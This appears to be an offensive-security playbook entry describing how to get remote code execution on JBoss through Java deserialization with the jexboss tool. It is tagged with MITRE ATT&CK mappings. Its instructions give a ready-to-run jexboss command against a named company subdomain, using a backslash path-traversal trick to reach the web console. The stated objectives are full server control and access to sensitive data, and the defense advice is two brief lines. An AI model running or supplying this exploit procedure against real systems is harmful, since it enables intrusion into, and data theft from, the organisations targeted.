---
tags:
  - rce
  - java-deserialization
type: procedure
tools:
  - '[[tools/jexboss]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-path-manipulation]]'
  - '[[commands/curl-directory-traversal]]'
  - '[[commands/jexboss-exploit]]'
platforms:
  - Web
techniques:
  - '[[Exploitation for Client Execution]]'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: 2f7612cd-9df9-496f-a2c7-605cc6b280c8
created_at: '2025-12-11T06:10:24.865Z'
updated_at: '2025-12-11T06:10:24.865Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1203]]'
---
# Achieve RCE via Java Deserialization with Jexboss

## Summary

This procedure uses jexboss to exploit Java deserialization in JBoss for remote code execution.

## Description

Targeting the exposed console, jexboss sends payloads for RCE, enabling server takeover, page modification, and data access.

## Requirements

1. Access to vulnerable JBoss endpoint
2. Jexboss tool installed
3. Adapted path for proxy bypass

## Defense

Defensive measures and detection strategies:

- Update JBoss and disable deserialization
- Monitor for anomalous requests to admin endpoints

## Objectives

1. Execute arbitrary code
2. Achieve full server control
3. Access sensitive data

## Instructions

### Step 1: Run Jexboss Exploit

**Context**: Target the adapted console path.

**Command** ([[commands/jexboss-exploit]]):
```bash
python jexboss.py -u "http://subdomain.starbucks.com/josso/%5C../web-console"
```

> Gain RCE shell and execute commands.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploitation for Client Execution]]

### Sub-Techniques



## Commands Used

- [[commands/jexboss-exploit]]

## Tools Used

- [[tools/jexboss]]

## Tags

- [[rce]]
- [[java-deserialization]]
